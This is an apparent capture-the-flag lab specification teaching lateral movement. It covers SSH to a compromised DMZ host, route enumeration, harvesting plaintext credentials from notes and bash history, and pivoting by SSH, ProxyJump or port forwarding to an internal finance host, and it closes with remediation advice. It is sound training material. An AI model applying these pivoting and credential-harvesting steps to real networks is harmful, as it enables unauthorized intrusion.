# Challenge 9 - Lateral Movement

## Purpose

The red team compromised a storefront web server in the Kestrel Freight DMZ during an earlier phase. The final objective lives on an internal finance host that is not routable from the attacker network. The learner uses the DMZ foothold to enumerate the internal segment, recover internal credentials, and pivot to the objective host.

All interaction runs through the in-page Kali terminal, which simulates three network contexts: Kali, the DMZ host, and the internal host.

## Scope

| Item | Value |
| --- | --- |
| Company | Kestrel Freight Group |
| Objective | `172.16.30.40` (`fin-db01.internal.lab`, internal segment) |
| Foothold | `webapp` / `W3b-App!2024` on `10.20.10.15` (`dmz-web01`) |
| Kali segment | `10.20.10.0/24` — no route to `172.16.30.0/24` |
| Internal credential | `jdoe` / `Jd0e-W1nt3r!` on `172.16.30.40` |
| Primary vulnerability | Flat DMZ-to-internal trust with recoverable internal credentials |
| Flag | `RIVAN{lateral_movement_pivot}` |

## Learning Objectives

- Verify network reachability boundaries before attacking (no route from Kali).
- Establish and operate from a foothold over SSH.
- Enumerate dual-homed hosts (`ip route`, `ip neigh`) to discover internal segments.
- Recover credentials from user artifacts (notes, bash history).
- Pivot with direct SSH from the foothold, ProxyJump, or a local port forward.

## Required Evidence

1. The foothold is established on the DMZ host.
2. The internal network is enumerated from the foothold.
3. Credentials for the internal host are recovered.
4. The internal target is confirmed reachable from the foothold.
5. The learner pivots into the internal host.
6. The final flag is retrieved.
7. The exact flag is submitted.

## Student Workflow

### Step 0 - Start or Reset the Lab

Open `/challenges/lateral-movement` and select **Reset lab**. Reset closes all SSH sessions and forwards, and clears evidence and flag state.

### Step 1 - Establish the Foothold

```bash
ssh webapp@10.20.10.15        # password: W3b-App!2024
```

From Kali, `ping 172.16.30.40` fails with "Destination Host Unreachable" — confirm the boundary before trying to cross it.

### Step 2 - Enumerate from the Foothold

On `dmz-web01`:

```bash
ip route          # eth0 10.20.10.15, eth1 172.16.30.15 — dual-homed
ip neigh          # neighbor 172.16.30.40 on the internal NIC
ls /home/webapp   # notes.txt
cat /home/webapp/notes.txt
cat /home/webapp/.bash_history
```

`notes.txt` documents `jdoe` / `Jd0e-W1nt3r!` for `fin-db01` (172.16.30.40); the bash history shows prior `ssh jdoe@172.16.30.40` use. `/var/www/html/config.php` holds decoy storefront database credentials.

### Step 3 - Confirm Reachability

```bash
ping 172.16.30.40      # succeeds from the foothold
nmap 172.16.30.40      # scan from the internal NIC
```

### Step 4 - Pivot

Directly from the foothold:

```bash
ssh jdoe@172.16.30.40           # password: Jd0e-W1nt3r!
```

Or from Kali with ProxyJump:

```bash
ssh -J webapp@10.20.10.15 jdoe@172.16.30.40
```

Or with a local forward:

```bash
ssh -L 2222:172.16.30.40:22 webapp@10.20.10.15
ssh -p 2222 jdoe@localhost
```

### Step 5 - Retrieve and Submit the Flag

On `fin-db01`:

```bash
ls                # flag.txt  payroll-exports
cat flag.txt      # RIVAN{lateral_movement_pivot}
```

Submit the exact value.

## Expected Evidence States

| Evidence | Trigger |
| --- | --- |
| Foothold established | Successful `ssh webapp@10.20.10.15` |
| Internal network enumerated | `ip route`, `ip a`, or `ip neigh` on the foothold |
| Credentials recovered | `/home/webapp/notes.txt` is read |
| Target confirmed reachable | `ping`, `nmap`, or `.bash_history` evidence for 172.16.30.40 |
| Pivot completed | Successful SSH to `jdoe@172.16.30.40` (direct, `-J`, or via `-L` forward on port 2222) |
| Flag retrieved | `cat flag.txt` on `fin-db01` |
| Flag submitted | Server validates the exact flag |

## Reset Requirements

Reset must close every SSH session and port forward, restore the terminal to the Kali context, and clear evidence and flag state.

## Instructor Notes

The three pivot techniques are all accepted intentionally: direct SSH from the foothold, ProxyJump (`-J`), and local port forwarding (`-L 2222:...:22` then `ssh -p 2222 jdoe@localhost`). The `-J` path requires the learner to have authenticated to the foothold at least once, mirroring real key/session hygiene. The decoy database credentials in `config.php` teach learners to distinguish useful loot from noise.

## Remediation

**Vulnerability:** Flat DMZ-to-internal trust combined with credentials stored in user artifacts.

**Attack surface:** Any compromised DMZ host with an internal NIC.

**Impact:** Attackers pivot from a single compromised DMZ host to internal finance systems.

**Root cause:** The DMZ host is dual-homed into the internal segment, and internal credentials were stored in plaintext onboarding notes.

**Remediation:** Segment DMZ from internal networks with explicit firewall policy, require brokering through a hardened jump host with MFA, prohibit credentials in notes/history/scripts and sweep for them, rotate exposed accounts, and alert on SSH from DMZ hosts to internal segments.
